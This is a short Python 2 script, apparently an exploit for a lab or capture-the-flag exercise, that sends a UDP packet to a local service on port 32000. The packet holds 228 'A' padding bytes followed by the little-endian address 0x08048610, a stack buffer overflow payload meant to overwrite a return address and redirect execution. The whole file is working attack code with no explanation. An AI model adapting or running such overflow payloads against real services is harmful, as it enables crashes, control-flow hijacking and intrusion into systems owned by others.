import socket
import sys

client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #UDP



#"0x8-04-86-10"
message = "A"*228+"\x10\x86\x04\x08"

try:
	client.sendto(message,("localhost",32000))

	d = client.recvfrom(1024)
	print d[0]
except socket.error, msg:
	sys.exit()